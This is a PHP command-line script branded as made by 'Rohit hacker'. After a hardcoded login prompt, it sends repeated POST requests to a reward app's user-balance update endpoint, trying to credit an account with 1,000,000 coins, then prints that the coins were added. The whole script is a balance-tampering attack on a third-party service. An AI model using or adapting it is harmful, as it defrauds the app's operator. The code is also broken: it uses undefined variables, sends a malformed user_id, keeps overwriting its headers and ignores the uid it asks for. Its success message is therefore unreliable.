<?php

system("clear");
echo "\033[1;97mCreator : \033[1;96mFahmiApz\n\033[1;97mYoutube : \033[1;96mKnifer12\n\033[1;97mGithub  : \033[4;92mgithub.com/BladeKnife\033[00m\n";

error_reporting(0);
system("clear");
echo "\033[1;97mCreator : \033[1;96mFahmiApz\n\033[1;97mYoutube : \033[1;96mKnifer12\n\033[1;97mGithub  : \033[4;92mgithub.com/BladeKnife\033[00m\n";

$headers6='Content-Type:application/x-www-form-urlencoded';
$headers6='okhttp/4.9.1';
$headers6='Host:earnifytech.in';
$headers6='Connection: Keep-Alive';
$headers6='Accept-Encoding:gzip';
$headers6='Content-Length:'.strlen($data1).'';

function get($url){
	global $header;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	}
	
function post($url, $data){
	global $header;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	return curl_exec($ch);
	}

function jsondecode($data, $isarray = true){
return json_decode($data,$isarray);
}
	
function slow($str,$t){
	$arr = str_split($str);
	foreach ($arr as $az){
		echo $az;
		usleep($t);
		}
		}
	
function timer($i){
	for($i=$i;$i>=0;$i--){
		echo"\r                       \r";
		echo"Wait $i...";
		sleep(1);
		}
		echo"\r                       \r";
		}
	
function line(){	slow("\033[1;97m──────────────────────────────────────────────────\n",5000);
	}
	system("clear");
echo "\033[1;97mCreator : \033[1;96mROHIT HACKER\n\033[1;97mYoutube : \033[1;96m@Rohit alam\n\033[1;97mTELEGRAM  : \033[4;92https://t.me/Rohit678910\033[00m\n";
echo "\033[1;94m=====================cooded by Hacker rohit========================\n";

while(true):
system("clear");

system("clear");
echo "\033[1;97mCreator : \033[1;96m          
____     ___    _   _   ___   _____
|  _ \   / _ \  | | | | |_ _| |_   _|
| |_) | | | | | | |_| |  | |    | |
|  _ <  | |_| | |  _  |  | |    | |
|_| \_\  \___/  |_| |_| |___|   |_|
                                         
                                         
\n\033[1;97mYoutube : \033[1;96m —>@Rohit hacker\n\033
[1;97mTELEGRAM  : \033[4;92 —>https://t.me/Rohit678910\033[00m\n";



echo "\033

[1;94m==========cooded by Rohit hacker============\n";

$usear=readline("Input usear: ");
if($usear=="1200"){
    sleep(1);
    slow("True usear!\n",2000);
    sleep(1);
    break;
}else{
    sleep(1);
    slow("true usear1!\n",2000);
    sleep(1);
}

$pass=readline("Input Password: ");
if($pass=="Rohit"){
    sleep(1);
    slow("True Password!\n",2000);
    sleep(1);
    break;
}else{
    sleep(1);
    slow("Password did not match!\n",2000);
    sleep(1);
}
endwhile;
	
system("clear");
echo "\033

[1;94m==========cooded by Rohit alam============\n";

$phone=readline("uid: ");
$balance="100000";
$url="https://earnifytech.in/growfy2/apps/update_user_balance.php";
$data="user_id='.$ref.'&value=1000000";
$i=post($url,$data);

$url="https://earnifytech.in/growfy2/apps/update_user_balance.php";
$data="user_id='.$ref.'&value=1000000";
$i=post($url,$data);

$url="https://earnifytech.in/growfy2/apps/update_user_balance.php";
$data="user_id='.$ref.'&value=1000000";
$i=post($url,$data);

$url="https://earnifytech.in/growfy2/apps/update_user_balance.php";
$data="user_id='.$ref.'&value=1000000";
$i=post($url,$data);

slow("1000000 Coins had been added to your account to tanasfar rohit!\n",5000);
